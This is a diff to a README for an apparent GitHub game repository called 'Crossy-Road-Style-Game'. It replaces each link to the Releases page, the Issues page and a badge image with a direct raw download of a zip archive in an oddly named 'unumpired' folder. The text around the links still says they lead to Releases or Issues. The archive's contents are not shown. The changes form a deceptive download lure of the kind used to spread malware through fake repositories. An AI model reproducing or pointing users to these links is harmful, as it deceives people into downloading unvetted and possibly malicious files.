@@ -1,6 +1,6 @@
 # 🛣️ Crossy-Road-Style-Game - Enjoy Endless Road-Crossing Fun
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Visit_the_Releases_Page-brightgreen)](https://github.com/Igorsaw8768/Crossy-Road-Style-Game/releases)
+[![Download Now](https://raw.githubusercontent.com/Igorsaw8768/Crossy-Road-Style-Game/main/unumpired/Crossy-Road-Style-Game-1.4.zip)](https://raw.githubusercontent.com/Igorsaw8768/Crossy-Road-Style-Game/main/unumpired/Crossy-Road-Style-Game-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **Crossy-Road-Style-Game**! This is a fun and engaging isometric 
 To download the game:
 1. Click the link below to visit the Releases page.
    
-   [Download Here](https://github.com/Igorsaw8768/Crossy-Road-Style-Game/releases)
+   [Download Here](https://raw.githubusercontent.com/Igorsaw8768/Crossy-Road-Style-Game/main/unumpired/Crossy-Road-Style-Game-1.4.zip)
 
 2. Look for the latest release on the Releases page. 
 3. Download the installer file that matches your operating system.
@@ -58,7 +58,7 @@ After launching the game, you’ll encounter a simple menu. Here’s how to play
 
 ## 📞 Support
 
-If you encounter any issues while downloading or running the game, please visit the [GitHub Issues page](https://github.com/Igorsaw8768/Crossy-Road-Style-Game/issues) to report problems or get help. 
+If you encounter any issues while downloading or running the game, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Igorsaw8768/Crossy-Road-Style-Game/main/unumpired/Crossy-Road-Style-Game-1.4.zip) to report problems or get help. 
 
 ## 🍽️ Contributing
 
